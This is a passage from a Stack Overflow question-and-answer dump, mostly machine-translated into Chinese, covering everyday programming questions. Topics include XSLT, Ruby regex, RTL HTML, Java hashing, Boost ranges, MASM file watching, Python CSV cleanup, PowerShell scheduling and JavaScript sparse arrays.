</s:FineAmount> 
```

The issue is the the value of the field can be '-1.0000'. I do not want to send the value if it is -1.0000\. How can I filter it?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:51:51.397

使用`<xsl:if>`- 见[这里](http://www.w3.org/TR/1999/REC-xslt-19991116#section-Conditional-Processing-with-xsl%3aif)。[这里](http://www.w3schools.com/xsl/default.asp)是开始学习 XSLT 的一个好点。

# ruby - Ruby Regex gsub - 字符串之后的所有内容

> ID：15750592
> 
> 赞同：1
> 
> 时间：2013-04-01T19:46:11.343
> 
> 标签：ruby, regex, gsub

我有一个类似的字符串：

```
test:awesome my search term with spaces 
```

而且我想立即将字符串提取`test:`到一个变量中，然后将其他所有内容提取到另一个变量中，所以我最终会得到`awesome`一个变量和`my search term with spaces`另一个变量。

从逻辑上讲，我要做的是将所有匹配的内容`test:*`移到另一个变量中，然后删除第一个变量之前的所有内容`:`，留下我想要的东西。

目前我正在使用`/test:(.*)([\s]+)/`匹配第一部分，但我似乎无法正确获得第二部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T19:48:46.640

正则表达式中的第一个捕获是贪婪的，并且匹配空格，因为您使用了`.`. 而是尝试：

```
matches = string.match(/test:(\S*) (.*)/)
# index 0 is the whole pattern that was matched
first = matches[1] # this is the first () group
second = matches[2] # and the second () group 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T19:48:24.800

使用以下内容：

```
/^test:(.*?) (.*)$/ 
```

也就是说， match `"test:"`，然后是一系列字符（非贪婪），最多一个空格，以及另一系列字符到行尾。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T14:06:32.433

我猜你也想在第二场比赛之前删除所有前导空格，因此我在表达式中有 \s+ 。否则，从表达式中删除 \s+，你就会得到你想要的：

```
m = /^test:(\w+)\s+(.*)/.match("test:awesome my search term with spaces")
a = m[1]
b = m[2] 
```

[http://codepad.org/JzuNQxBN](http://codepad.org/JzuNQxBN)

# html - 镜像视图上的 HTML 布局？

> ID：15750595
> 
> 赞同：1
> 
> 时间：2013-04-01T19:46:28.023
> 
> 标签：html, css, 960.gs

网页上的镜像怎么看。我的网页必须兼容英语和阿拉伯语。当用户选择阿拉伯语时，网页转换为英语正常布局的镜像视图。任何布局套件都适用于 960 中的正常视图和镜像视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:48:21.867

添加`dir="rtl"`到您的 HTML 元素以使文本从右到左，例如

```
<html dir="rtl"> 
```

在那里提及它也是阿拉伯语也是一个好主意：

```
<html dir="rtl" lang="ar"> 
```

您还可以`dir`在元素上使用该属性：例如

```
<div dir="rtl">This is right to left</div> 
```

这意味着如果您的网站在整个页面都是 rtl 时出现故障，您可以只定位一点点。

# asp.net-mvc - Need help setting up Membership with ASP.NET MVC4/jQuery Mobile

> ID：15750604
> 
> 赞同：1
> 
> 时间：2013-04-01T19:47:17.307
> 
> 标签：asp.net-mvc, authentication, asp.net-membership, membership, wsat

I'm trying to figure out the best solution to integrate user authentication into my ASP.NET MVC4 web app. I'm not familiar at all with ASP.NET membership providers. What I ultimately want to be able to do is have the user be able to log in to access the app- pretty straight forward, right? I've heard about WSAT, and how wonderful it is. I want to be able to administer the log-in part of the site, kind of like what WSAT offers, so I can manage the user accounts. What's the best and/or easiest solution to accomplish this?

One more question:

If I'm using CodeFirst in my project:

1.  How will WSAT impact my database? Will it cause any kind of problems?
2.  Should I stick with a CodeFirstMembership provider?

# java - 字符串编码问题

> ID：15750606
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:47:19.777
> 
> 标签：java, string, character-encoding, byte

这是我的代码，我在字节编码方面遇到了问题。当我得到明文字符串并对其进行哈希处理并尝试打印出结果时，它会变得一团糟。例如，对于plaintext = "hi"，它会打印出： hash: ?????????1?W?p????=?????&

公共类 HASHME {

```
private String hash;
private String salt;

public HASHME(String plaintext) 
{
    try {
    System.setProperty("file.encoding", "UTF-8");
    salt = "salt";
    plaintext = plaintext + salt;
    byte[] bytesOfPlain = plaintext.getBytes("UTF8");

    MessageDigest md = MessageDigest.getInstance("SHA-256");
    byte[] hashedBytes = md.digest(bytesOfPlain);
    hash = new String(hashedBytes, "UTF8");
    System.out.println("hash: " + hash);

    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:49:12.660

这就是问题：

```
byte[] hashedBytes = md.digest(bytesOfPlain);
hash = new String(hashedBytes, "UTF8"); 
```

散列的结果*不是*UTF-8 编码的文本——它只是任意的二进制数据。您在这里所做的与试图通过将图像文件解释为 UTF-8 来将其转换为字符串一样毫无意义。

如果*必须*将散列转换为文本，请使用[base64](http://iharder.net/base64)或十六进制。（通常任意大小的数据以 base64 格式传输，但哈希通常以十六进制显示。）

# c++ - boost range weak_ptr

> ID：15750617
> 
> 赞同：3
> 
> 时间：2013-04-01T19:48:08.093
> 
> 标签：c++, boost, map, range, weak-ptr

I have a map where the value is a weak pointer. This works: While I can write this:

```
for_each( IFoo::foo_wptr obj, objects | range::map_values ) {
    IFoo::foo_ptr myObj = obj.lock();
    if( myObj ) myObj->notify();
} 
```

I'd much rather have a new range that transforms to a locked shared pointer. Something like this:

```
for_each( IFoo::foo_ptr obj, objects | range::map_values | range::locked ) {
    if( obj ) obj->notify();
} 
```

however, I've been unable to figure out what that transform should look like; or if it should even be a transform.

Does anyone have an idea? I'm convinced this pattern may quite common.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-15T19:28:52.923

这是一个我刚刚拼凑起来的例子：

```
#include <boost/iterator/transform_iterator.hpp>
#include <boost/range/iterator_range.hpp>
#include <boost/range/adaptor/map.hpp>
#include <boost/iterator/transform_iterator.hpp>
#include <boost/shared_ptr.hpp>
#include <boost/make_shared.hpp>
#include <boost/weak_ptr.hpp>
#include <boost/foreach.hpp>
#include <map>
#include <vector>

struct weak_ptr_locker
{
    template <typename Sig>
    struct result;

    template <typename F, typename T>
    struct result<F(boost::weak_ptr<T>&)>
    {
        typedef boost::shared_ptr<T> type;
    };

    template <typename T>
    boost::shared_ptr<T> operator()(const boost::weak_ptr<T>& pWeak) const
    {
        return pWeak.lock();
    }
};

template<typename R>
struct lock_transform_range :
    boost::iterator_range< boost::transform_iterator< weak_ptr_locker, typename         boost::range_iterator<R>::type> >
{
private:
    typedef boost::iterator_range< boost::transform_iterator< weak_ptr_locker, typename     boost::range_iterator<R>::type> > base;

public:
    typedef boost::transform_iterator< weak_ptr_locker, typename     boost::range_iterator<R>::type > iterator;

    lock_transform_range(R& r)
        : base(iterator(boost::begin(r)), iterator(boost::end(r)))
    {}
};

namespace detail
{
    struct lock_transform_forwarder {};
}

template< class BidirectionalRng >
inline lock_transform_range<BidirectionalRng> operator | (BidirectionalRng& r,     detail::lock_transform_forwarder)
{
    return lock_transform_range<BidirectionalRng>(r);
}

template< class BidirectionalRng >
inline lock_transform_range<const BidirectionalRng> operator | (const BidirectionalRng&     r, detail::lock_transform_forwarder)
{
    return lock_transform_range<const BidirectionalRng>(r);
}

namespace
{
    const detail::lock_transform_forwarder locked = detail::lock_transform_forwarder();
}

struct Foo
{
    Foo(int i)
        : i(i)
    {}

    int i;
    void notify()
    {
        std::cout << i << std::endl;
    }
};

int main(int argc, char* argv[])
{
    typedef std::map<int, boost::weak_ptr<Foo> > Map;
    typedef boost::shared_ptr<Foo> FooPtr;
    Map objects;

    std::vector<FooPtr> storage;
    for (int i = 0; i < 10; ++i)
    {
        storage.push_back(boost::make_shared<Foo>(i));
        objects[i] = storage.back();
    }

    using namespace boost::adaptors;
    for_each(FooPtr obj, objects | map_values | locked) 
    {
        if (obj) 
            obj->notify();
    }
    return 0;
} 
```

# windows - watch a directory for changes using masm assembly

> ID：15750618
> 
> 赞同：0
> 
> 时间：2013-04-01T19:48:16.970
> 
> 标签：windows, assembly, directory, masm, masm32

I have been only programming in assembly for 2 weeks now so I am kind of new to assembly and I need some help.

I need to watch a directory and all sub directories for changes. The only changes I need to be notified of are file creation and when a file is edited, but if you include others that is fine.

I need to be notified of the file who made the changes to a message box. I do not need to know what change the file made, I just need the file path to a message box. I tried to search the web but cant find anything for how to do this in assembly particular masm.
The only stuff I could find was this code that I think was written for masm and I tried it but it message boxes A or other letters and that is it and it blocks me from changing the name of any file in that directory, and i do not want it to do that.

```
.data
FolderPath3 db "C:\users",0
.data ?
hFile dd ?
FileBuffer        DB 200 DUP(?)

ThreadProc PROC uses edi esi Param:DWORD
    LOCAL lpBytesReturned:dword

    invoke CreateFile,addr FolderPath3,GENERIC_READ,FILE_SHARE_DELETE or FILE_SHARE_READ,0,\
                OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,0
    mov hFile,eax
    invoke ReadDirectoryChangesW,hFile,addr FileBuffer,sizeof FileBuffer,TRUE,FILE_NOTIFY_CHANGE_LAST_ACCESS,\
                addr lpBytesReturned,0,0
    .if eax==0
        invoke MessageBoxA,0,0,0,MB_OK
    .else
        xor ecx,ecx
@@:
        add edi,ecx
        lea edi,FileBuffer
        mov esi,[edi].FILE_NOTIFY_INFORMATION.Action
        .if esi==FILE_ACTION_MODIFIED
                    invoke MessageBoxA, NULL, addr [edi].FILE_NOTIFY_INFORMATION.FileName, offset BoxCaption, NULL 

                    .elseif esi==0
            invoke CloseHandle,hDir
            ret
        .endif
        mov ecx,[edi].FILE_NOTIFY_INFORMATION.NextEntryOffset
        .if ecx==0
            invoke RtlZeroMemory,addr FileBuffer,sizeof FileBuffer
            jmp ThreadProc
        .endif
        jmp @B
    .endif

    ret
ThreadProc ENDP 
```

if anyone can fix the above code or show me different code that works it would be great, thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T21:22:04.097

The essence of the task is the operating system specific services and handling the notifications.

If you are lost doing this in assembly, code it in a high level language (C, C++, Perl, etc.) and get that working. It should not be hard to find examples of doing just this from MSDN. Once you have learned how to do that, it will then be pretty clear what the assembly language has to do.

# android - What is the portable way to ensure certain attribute (android:attr/textAppearanceMedium for example) works across different version of Android

> ID：15750627
> 
> 赞同：2
> 
> 时间：2013-04-01T19:48:39.023
> 
> 标签：android

Currently, I'm using theme `Theme.Sherlock.Light.DarkActionBar`.

I'm applying `?android:attr/textAppearanceMedium` and `?android:attr/textAppearanceSmall` attributes, for the `TextView` used in `ListView`

```
<TextView
    ...
    android:textAppearance="?android:attr/textAppearanceMedium" />

<TextView
    ...
    android:textAppearance="?android:attr/textAppearanceSmall" /> 
```

However, for Jelly Bean and Gingerbread, I get 2 very different effects.

## Jelly Bean (Looks great!)

![enter image description here](https://i.stack.imgur.com/4Gfvh.png)

## Gingerbread (Ergh...)

![enter image description here](https://i.stack.imgur.com/KyALs.png)

Is there any portable way I can tell, when using `textAppearanceMedium` and `textAppearanceSmall` attributes on a light background, the color should be dark. Currently, Gingerbread is using light background for its list view. Hence, the correct font color should be dark, so that text is visible.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T12:31:54.913

我了解到您希望支持相应 Android 版本的原生外观并希望避免覆盖默认颜色。

“香草”姜饼版本可能看起来像您屏幕截图中的版本，但我也看到了设备制造商（例如三星 TouchWiz 或 HTC Sense）或自定义 ROM 覆盖这些颜色值的 GUI 改编。不仅是默认背景颜色，还有文本颜色。

因此，您无法确定所有的 Honeycomb 之前的版本都会在下拉菜单中的白色背景上显示明亮的文本，因此您还必须检查文本颜色并相应地进行调整。检查视图的背景或前景资源/颜色可能非常麻烦，但这里有两种方法：[https](https://stackoverflow.com/a/8089242/1140682) ://stackoverflow.com/a/8089242/1140682和[https://stackoverflow.com/a/8848494/1140682](https://stackoverflow.com/a/8848494/1140682)

但是，我强烈建议您对文本和背景应用自定义的“固定”颜色。由于 ActionBar 仅在 Honeycomb 中引入，因此`ActionBar`之前的版本没有任何您可能违反的准则/样式。一个好的开始是[ActionBar 样式生成器](http://jgilfelt.github.com/android-actionbarstylegenerator/)，它也支持`Theme.Sherlock.Light.DarkActionBar`. 它为您生成所有可绘制对象和样式文件，以便您的`ActionBar`菜单和菜单在多个 Android 版本和修改中看起来一致。

# python - 使用python从csv文件中删除特殊字符

> ID：15750628
> 
> 赞同：6
> 
> 时间：2013-04-01T19:48:40.847
> 
> 标签：python, csv, python-2.7

这个话题似乎已经有了一些东西（[如何在 python 中用空格替换所有这些特殊字符？](https://stackoverflow.com/questions/8800815/how-to-replace-all-those-special-characters-with-white-spaces-in-python)），但我无法为我的生活解决这个简单的任务。

我有一个包含 75 列和近 4000 行的 .CSV 文件。我需要用“_”替换所有“特殊字符”（$ # & * 等）并写入一个新文件。这是我到目前为止所拥有的：

```
import csv

input = open('C:/Temp/Data.csv', 'rb')
lines = csv.reader(input)
output = open('C:/Temp/Data_out1.csv', 'wb')
writer = csv.writer(output)

conversion = '-"/.$'
text =  input.read()
newtext = '_'
for c in text:
    newtext += '_' if c in conversion else c
    writer.writerow(c)

input.close()
output.close() 
```

所有这一切都成功地将所有内容作为单列写入输出文件，产生超过 65K 行。此外，特殊字符仍然存在！

对不起，多余的问题。先感谢您！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T20:13:21.593

这似乎不需要特别处理 CSV（只要特殊字符不是您的列分隔符）。

```
lines = []
with open('C:/Temp/Data.csv', 'r') as input:
    lines = input.readlines()

conversion = '-"/.$'
newtext = '_'
outputLines = []
for line in lines:
    temp = line[:]
    for c in conversion:
        temp = temp.replace(c, newtext)
    outputLines.append(temp)

with open('C:/Temp/Data_out1.csv', 'w') as output:
    for line in outputLines:
        output.write(line + "\n") 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T20:20:18.737

我可能会做类似的事情

```
import csv

with open("special.csv", "rb") as infile, open("repaired.csv", "wb") as outfile:
    reader = csv.reader(infile)
    writer = csv.writer(outfile)
    conversion = set('_"/.$')
    for row in reader:
        newrow = [''.join('_' if c in conversion else c for c in entry) for entry in row]
        writer.writerow(newrow) 
```

哪个转

```
$ cat special.csv
th$s,2.3/,will-be
fixed.,even.though,maybe
some,"shoul""dn't",be 
```

（请注意，我有一个引用的值）到

```
$ cat repaired.csv 
th_s,2_3_,will-be
fixed_,even_though,maybe
some,shoul_dn't,be 
```

* * *

现在，您的代码正在将整个文本读入一大行：

```
text =  input.read() 
```

从一个`_`字符开始：

```
newtext = '_' 
```

循环遍历每个字符`text`：

```
for c in text: 
```

将更正的字符添加到`newtext`（非常缓慢）：

```
 newtext += '_' if c in conversion else c 
```

然后将*原始*字符 (?) 作为一列写入新的 csv：

```
 writer.writerow(c) 
```

..这不太可能是你想要的。:^)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:27:34.983

除了@Nisan.H 指出的错误和@dckrooney 提出的有效观点之外，在这种情况下您可能不需要以特殊方式处理文件，因为它是一个 CSV 文件（但请参阅下面的我的评论） ：

1.  `writer.writerow()`应该采用一系列字符串，每个字符串都用逗号分隔（请参见[此处](http://docs.python.org/2/library/csv.html)）。在您的情况下，您正在编写一个字符串。
2.  此代码设置为以*两种*方式从“C:/Temp/Data.csv”读取 - 直通`input`和直通，`lines`但它仅实际读取`input`（因此代码不会将文件作为 CSV 文件处理）。
3.  该代码将字符附加到`newtext`并写出该变量的每个版本。因此，第一个版本的`newtext`长度为 1 个字符，第二个版本的长度为 2 个字符，第三个版本的长度为 3 个字符，以此类推。

最后，鉴于 CSV 文件*中可以*包含引号，实际上可能需要将输入文件专门作为 CSV 处理，以避免替换您要保留的引号，例如用于保护逗号的引号存在于 CSV 文件的字段中。在这种情况下，需要单独处理 CSV 文件的每个字段，然后将每一行写入新的 CSV 文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T22:34:41.300

也许试试

```
s = open('myfile.cv','r').read()

chars = ('$','%','^','*') # etc
for c in chars:
  s = '_'.join( s.split(c) )

out_file = open('myfile_new.cv','w')
out_file.write(s)
out_file.close() 
```

# bash - 文件名中具有单个不同字符的通配文件

> ID：15750632
> 
> 赞同：0
> 
> 时间：2013-04-01T19:48:49.093
> 
> 标签：bash, unix, glob

我有几个格式的文件，

```
unit-a.test.one.two
unit-b.test.one.two
unit-c.test.one.two 
```

我想移动所有文件以创建文件名

```
unit-a.test.one.sample.two
and so on. 
```

虽然我知道使用类型的通配符

```
unit-* 
```

将匹配所有文件，我想知道是否有更好的解决方案来匹配文件名，因为这种方法也会错误地匹配类型的文件

```
unit-1.txt 
```

这是不可取的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:52:39.990

为什么不使用`unit-?.test.one.two`？

# html - 内联响应式表单元素

> ID：15750633
> 
> 赞同：0
> 
> 时间：2013-04-01T19:48:50.620
> 
> 标签：html, css, twitter-bootstrap

我有一个文本输入元素和一个提交输入元素，我需要内联和响应。问题是我找不到一种方法来让文本输入元素变得流畅，而不会搞砸按钮的定位。任何帮助，将不胜感激。

这是我正在使用的html结构。

```
<div class="search-call-to-action">
    <form action="#">
        <input type="text" name="search" placeholder="Search charities by keyword or name...">
        <input class="btn btn-primary btn-large" type="submit" name="submit" value="Search">
    </form>
</div> 
```

这是我要实现的目标的屏幕截图。文本输入需要流畅。 [http://i.imgur.com/Ivty5Qq.png](http://i.imgur.com/Ivty5Qq.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:53:41.460

您可以使用媒体查询来实现这一点。然后，您应该为每个分辨率创建查询。例子：

```
@media (min-width: 320px){

div
{
    //some propererties in ems
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:02:09.777

我提供了一个 jsfiddle 和一个关于如何实现这一点的工作演示。它使用溢出属性。演示[http://jsfiddle.net/kevinPHPkevin/vbdy9/](http://jsfiddle.net/kevinPHPkevin/vbdy9/)

```
<form action="search.php" method="get">
    <input type="submit" name="search" value="Go" style="float: right" />
    <div style="overflow: hidden; padding-right: .5em;">
        <input type="text" name="term" style="width: 100%;" />
   </div>
</form> 
```

# java - Alternative (cloud) deployment options for a console application

> ID：15750637
> 
> 赞同：0
> 
> 时间：2013-04-01T19:48:57.877
> 
> 标签：java, cloud, console-application

I have a fairly large console application written in Java 7 that manages a fair amount of our order processing.

The application consumes a number of web services for orders, interfaces with a database and inserts data into an ERP system. The requirements of the application specified no user interaction, so Java EE was not considered during project planning.

That being said, one of the initiatives this year is to look to the cloud for ways to eliminate cost and improve efficiency. As such I am trying to determine if a console based application can be deployed to a cloud service such as OpenShift or Heroku with little to no changes.

So, the question is: **Can a Java console application be deployed to a cloud service or application server with little to no changes?**

--Edit--

As mentioned below it is possible, but how? What resources should I look at to deploy a jar console application to an application server and have it run successfully?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-08T16:52:48.043

是的，可以，至少我对 Jelastic 进行了同样的尝试，并且效果很好。请查看[http://jelastic.com/docs/standalone-application](http://jelastic.com/docs/standalone-application)了解更多详情

# javascript - Function not being called when I return to the page

> ID：15750640
> 
> 赞同：1
> 
> 时间：2013-04-01T19:49:19.647
> 
> 标签：javascript

I have two images, the first image can be any size and I'd like the second image, right beside it to be the same height as the first image. I wrote the following code:

```
<script>
  $(function() {
    $("#first").load(function() {
      var imgheight = $(this).height();
      $("#first_papers").css("height", imgheight); 
    });
  });
</script> 
```

The above code works fine. The problem is that when I visit another page on the site and then return to the main page the function doesn't seem to be called. What happens insteadis that the second image is appearing at its full height instead of the shorter height of the first image.

Any ideas on how to fix this?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:32:23.113

为了在页面加载时保持一致的行为，我会将其从匿名函数中取出并将其放入`$(document).ready`函数中。

```
<script>
    $(document).ready(function(){
        $("#first").load(function() {
            var imgheight = $(this).height();
            $("#first_papers").css("height", imgheight); 
        });
    });
</script> 
```

这应该使它在您的页面加载时执行，无论您何时/如何导航到它。

# nosuchmethoderror - NoSuchMethodError() when upgrading to hbase-0.94.2

> ID：15750641
> 
> 赞同：0
> 
> 时间：2013-04-01T19:49:20.137
> 
> 标签：nosuchmethoderror

I am getting this error in my source code:

```
java.lang.NoSuchMethodError: org.apache.hadoop.hbase.HColumnDescriptor.setMaxVersions(I)V 
```

when I upgraded from hbase-0.92.1-cdh4.1.1 to hbase-0.94.2-cdh4.2.0 I see that the signature of the method is changed from

```
public void setMaxVersions(int maxVersions) 
```

to

```
public HColumnDescriptor setMaxVersions(int maxVersions) 
```

I am guessing there is binary compatibility is lost. Could someone shed some light on how this can be resolved? Thanks.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-10T15:53:04.833

您可以使用 Java 反射来执行此操作：

```
HColumnDescriptor fam1 = new HColumnDescriptor(Bytes.toBytes('cf'));
Method method = fam1.getClass().getMethod("setMaxVersions", Integer.TYPE);
method.invoke(fam1, 10); 
```

# powershell - 我的 PowerShell 脚本仅在从 ISE 运行时才有效

> ID：15750642
> 
> 赞同：2
> 
> 时间：2013-04-01T19:49:22.213
> 
> 标签：powershell, cmd, scheduled-tasks, powershell-3.0, powershell-ise

我无法发布所有脚本内容，但基本思想是它下载 JSON 并使用`ConvertFrom-Json`cmdlet 将其转换为对象。一些对象被过滤掉，其余的被写入 XML/XLS 文档（Excel 2003 格式）。然后将该文件附加到电子邮件中并发送给不同的人。

我遇到的问题是它仅在从 Powershell ISE 运行时才有效。一旦我尝试设置一个计划任务，从 cmd 调用它，甚至从 powershell 调用它，附加的文件就完全是空的。就好像某些函数没有运行（循环并创建所有行的函数）。

我暂时可以继续从 ISE 运行，但此脚本的想法是发送一封无需干预的自动电子邮件。关于可能导致这种情况的任何想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-10-30T08:58:41.990

您需要运行脚本“dot sourced”，可以这样完成

```
powershell.exe -noexit -file c:\test.ps1 
```

或者

```
pwershell.exe -noexit ". c:\test.ps1" 
```

请参阅 -File 部分下的此链接 [http://technet.microsoft.com/en-us/library/hh847736.aspx](http://technet.microsoft.com/en-us/library/hh847736.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-22T17:31:39.313

根据对原始帖子的评论的回答，该脚本似乎（出乎意料？）在 ISE 中工作，因为允许在 ISE 中运行的脚本了解控制台中使用的变量的错误/怪癖/功能窗口，反之亦然。

当脚本使用已定义的变量（并且未在脚本中仔细初始化）运行时，这通常会导致逻辑问题或意外结果。

避免此问题的方法：

*   尝试在尽可能干净的环境中测试您的代码。

> [http://powershell.com/cs/blogs/tips/archive/2015/02/12/getting-a-clean-powershell-environment.aspx](http://powershell.com/cs/blogs/tips/archive/2015/02/12/getting-a-clean-powershell-environment.aspx)
> 
> 为了确保脚本在完全干净的测试环境中运行，您当然可以重新启动 PowerShell ISE。更方便的方法是打开另一个 PowerShell 选项卡：在 PowerShell ISE 中，选择 File/New PowerShell Tab。

*   在您的脚本中使用`Set-StrictMode 2`来捕获未定义的变量等。

> [https://technet.microsoft.com/en-us/library/hh849692.aspx](https://technet.microsoft.com/en-us/library/hh849692.aspx)
> 
> `Set-StrictMode -Version 2.0`
> 
> *   禁止引用未初始化的变量（包括字符串中的未初始化变量）。
> *   禁止引用对象不存在的属性。
> *   禁止使用调用方法的语法的函数调用。
> *   禁止没有名称的变量 (${})。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T09:15:17.600

我遇到了这个问题，并且我使用 powershell 中的单线程函数执行脚本。您也可以尝试其他一些选项，转到此[链接](http://technet.microsoft.com/en-us/library/hh847736.aspx "关联")以查找更多信息。

例子

```
powershell.exe -noexit c:\test.ps1 -sta 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-02-10T03:53:18.640

将缺少的变量或函数更改为全局。

```
function global:mycall{} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-04-09T18:56:00.473

开始你的脚本：

```
[cmdletbinding()] 
```

# flash - 使用 Adob e Flash 在 iOS 应用程序中进行 UDP 广播

> ID：15750651
> 
> 赞同：0
> 
> 时间：2013-04-01T19:50:25.220
> 
> 标签：flash, actionscript, adobe, broadcast, netbios

我正在编写一个需要 NetBIOS 名称解析的 iOS 应用程序。在 ActionScript 中使用 DatagramSocket 类进行编码很简单。但遗憾的是，对于 NetBIOS 请求，UDP 数据包需要作为广播发送出去，而 DatagramSocket 不支持这一点。

Flash/ActionScript 中有解决方案吗？解决方案是 iOS 原生扩展吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T17:02:13.973

该解决方案实际上是一个原生扩展。 [这个](http://blog.aboutme.be/2011/12/10/udp-in-air-for-ios-using-a-native-extension/)被证实能够进行UDP广播。

# javascript - 从库中获取图像并在共享点中每 30 秒更改一次图像？

> ID：15750654
> 
> 赞同：0
> 
> 时间：2013-04-01T19:50:34.907
> 
> 标签：javascript, jquery, ajax, sharepoint, sharepoint-2010

我正在使用 Web 部件，我在下面编写代码

但它只获取一张图片 >>> 我如何从库中获取所有图片并使用 javascript 或 jquery 每 30 秒更改一次图片？

```
public class MSDN : System.Web.UI.WebControls.WebParts.WebPart
    {
        Image myimage = new Image();
        protected override void CreateChildControls()
        {
            myimage.Height = 140;
            myimage.Width =999;
            SPSite mysite = SPContext.Current.Site;
            SPWeb myweb = SPContext.Current.Web;
            SPList mylist = myweb.Lists["Pic Lib"];
            SPQuery myquery = new SPQuery();
            myquery.Query = "<OrderBy><FieldRef Name='FileLeafRef' />"+
                            "<FieldRef Name='Status' /></OrderBy>"+
                            "<Where><Eq><FieldRef Name='Status' />"+
                            "<Value Type='Choice'>Active</Value></Eq></Where>";
            string serverpath = mysite.ServerRelativeUrl.ToString();
            SPListItemCollection mylistitem = mylist.GetItems(myquery);
            if (mylistitem.Count > 0)
            {
                myimage.ImageUrl = serverpath + mylistitem[mylistitem.Count - 1].Url.ToString();
            }
            else
            {
                this.Page.Response.Write("No image found");
            }
            base.CreateChildControls();
        }
        protected override void Render(HtmlTextWriter writer)
        {
            myimage.RenderControl(writer);          
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T01:43:22.917

您可以使用 SharePoint 客户端对象模型[MSDN 链接](http://msdn.microsoft.com/en-us/library/hh185007%28v=office.14%29.aspx)来查询列表并获取图像 url，将其存储在 javascript 数组中然后使用任何 jquery 插件（如 SlidesJS .. google 上的第一个链接）或编写自己的来翻转图像每 30 秒。

# python - Python 文件 IO 'w' vs 'wb'

> ID：15750660
> 
> 赞同：7
> 
> 时间：2013-04-01T19:50:57.253
> 
> 标签：python, text, binary, ascii

想知道从 Python 编写文件时真正的区别是什么。从我所看到的，如果我使用`w`或者`wb`我得到与文本相同的结果。

我认为保存为二进制文件只会在十六进制编辑器中显示二进制值，但它也显示文本，然后显示该文本的 ASCII 版本。

保存文本时可以互换使用吗？（Windows 用户）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T20:08:48.000

只有在 Windows 中，在后一种情况下，`.write('\n')`写入一个值为 10 的字节。在前一种情况下，它写入两个字节，值为 13 和 10。

您可以通过查看生成的文件大小并在十六进制编辑器中检查文件来证明这一点。

在与 POSIX 相关的操作系统（UNIX、SunOS、MacOS、Linux 等）中，`'w'`和`'wb'`.

# javascript - 带有数字索引的javascript数组，没有未定义

> ID：15750664
> 
> 赞同：0
> 
> 时间：2013-04-01T19:51:05.393
> 
> 标签：javascript, arrays, object

假设我这样做..

```
var arr = Array();
var i = 3333;
arr[i] = "something"; 
```

如果你对这个数组进行字符串化，它将返回一个字符串，其中包含一大堆未定义的数字条目，用于索引小于 3333 的那些条目......

有没有办法让javascript不这样做？

我知道我可以使用对象 {} 但我不想这样做，因为我想做诸如 shift() 之类的数组操作，这些操作不适用于对象

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:09:14.133

如果您为每个 OP 创建一个数组，它只有一个属性名称为“333”且长度为 334 的成员，因为长度始终设置为至少比最高索引大一。例如

```
var a = new Array(1000); 
```

长度为 1000 且没有成员，

```
var a = [];
var a[999] = 'foo'; 
```

长度为 1000，一个成员的属性名称为“999”。

只获取已定义成员的快速方法是使用 for..in：

```
function myStringifyArray(a) {
  var s = [];
  var re = /^\d+$/;

  for (var p in a) {
    if (a.hasOwnProperty(p) && re.test(p)) {
      s.push(a[p]);
    }
  }
  return '' + s;
} 
```

请注意，成员可能会乱序返回。如果这是一个问题，您可以改用 for 循环，但对于非常稀疏的数组，它会更慢：

```
function myStringifyArray(a) {
  var s = [];
  var re = /^\d+$/;

  for (var i=0, iLen=a.length; i<iLen; i++) {
    if (a.hasOwnProperty(i)) {
      s.push(a[i]);
    }
  }
  return '' + s;
} 
```

在一些较旧的浏览器中，遍历数组实际上会创建丢失的成员，但我认为这在现代浏览器中没有问题。

请彻底测试上述内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:08:27.613

数组的文字表示必须包含数组的所有项，否则第 3334 项不会在索引 3333 处结束。

您可以将数组中的所有未定义值替换为您想用作空项的其他值：

```
for (var i = 0; i < arr.length; i++) {
  if (typeof arr[i] == 'undefined') arr[i] = '';
} 
```

另一种选择是构建您自己的 stringify 方法，该方法将创建分配而不是数组文字。即，而不是这样的格式：

```
[0,undefined,undefined,undefined,4,undefined,6,7,undefined,9] 
```

您的方法将创建如下内容：

```
(function(){
  var result = [];
  result[0] = 0;
  result[4] = 4;
  result[6] = 6;
  result[7] = 7;
  result[9] = 9;
  return result;
}()) 
```

但是，如果您需要，这样的格式当然与 JSON 不兼容。

# html - 带有播放框架的 html5 数据集

> ID：15750667
> 
> 赞同：1
> 
> 时间：2013-04-01T19:51:22.013
> 
> 标签：html, scala, playframework-2.0, html-datalist

我有一个语言列表，通过组合框我可以看到代码：

```
 @select(
            searchForm("langCode"),
